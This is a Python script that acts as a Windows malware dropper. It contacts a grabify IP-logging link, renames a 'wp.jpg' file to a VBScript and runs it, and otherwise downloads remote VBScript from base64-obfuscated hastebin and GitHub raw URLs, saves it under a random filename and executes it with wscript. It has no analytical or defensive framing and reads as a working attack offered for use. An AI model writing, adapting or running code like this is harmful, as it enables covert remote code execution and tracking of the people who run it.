import string
import subprocess
import platform
import base64
import requests
import random, string
import os
os1 = platform.system()
if os1 == "Windows":
  texto = requests.get("https://grabify.link/XS3QYF").text
  try:
      os.rename('wp.jpg', "new.vbs")
      subprocess.call("wscript new.vbs")
  except:
      try:
         cuerda = base64.b64decode("aHR0cHM6Ly9oYXN0ZWJpbi5jb20vcmF3L2lkYW1leG9naWI==")
         texto = requests.get(cuerda).text
         x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)) + ".vbs"
         f = open(x, "a")
         f.write(str(texto))
         f.close()
         subprocess.call("wscript %s " %  x)
      except:
           try:
              cuerda = base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RhY29NRS9oZWxsb3dvcmQvbWFzdGVyL3RhY29iZWxs")
              texto = requests.get(cuerda).text
              x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)) + ".vbs"
              f = open(x, "a")
              f.write(str(texto))
              f.close()
              subprocess.call("wscript %s " %  x)
           except:
              print
